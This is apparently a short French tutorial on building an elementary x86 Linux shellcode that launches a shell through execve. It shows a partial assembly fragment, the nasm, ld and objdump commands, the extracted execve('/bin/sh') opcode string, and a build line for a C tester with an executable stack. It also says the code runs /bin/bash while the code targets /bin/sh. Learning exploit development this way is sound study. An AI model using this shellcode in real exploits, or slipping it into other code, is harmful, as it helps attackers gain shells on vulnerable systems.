Qu'est ce qu'un shellcode :
Un shellcode est une chaine de caracteres qui represente du code binaire executable. A l'origine il est destine a lancer un shell et est communemment ecrit en langage machine.

Avant toute chose, installer si ce n'est déjà fait nasm et objdump :
``sudo apt-get install binutils nasm``

Le but ici est de developper un shellcode elementaire qui lancera la commande ``/bin/bash``.
Afin de le faire, je vais utilsier la fonction en C execve.
Cette fonction permet simplement de lancer le programme qui lui est spécifiée en argument.

Le script en Assembly est le suivant :
step1.asm

    push 0x68732f2f ; => ASCII sh//
    push 0x6e69622f ; => ASCII nib/

    mov ebx, esp    ;  => actuellement /bin/sh

Il faut ensuite compiler le fichier :
``nasm -f elf32 -o step1.o step1.asm``
Puis le rendre exécutable :
``ld -m elf_i386 -o step1 step1.o``

Si on souhaite examiner l'executable, on utiliser objdump :
``objdump -M intel -d step1``

On obtient entre autre les opcodes. En les collectant, i lsera possible de realiser le shellcode.
Pour le faire, plutot que de devoir les recopier manuellement, on peut realiser un petit script bash :
shell_extract.sh

Et lancer donc la commande :
``./shell_extract.sh step1``
La SYSOUT devrait ressembler à :
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80

La séquence d'octets précédente, lorsqu'elle est placée en mémoire exécutable et lorsque l'EIP y est redirigé, entraînera l'exécution par le programme des instructions d'assemblage que nous avons codées dans le fichier initial et lancera la commande /bin/bash.

Un testeur de shellcode existe en C :
shellcode_tester.c
Il faut ensuite le compiler :
``gcc -z execstack -m32 -o run run.c``
Et le lancer :
``./run``
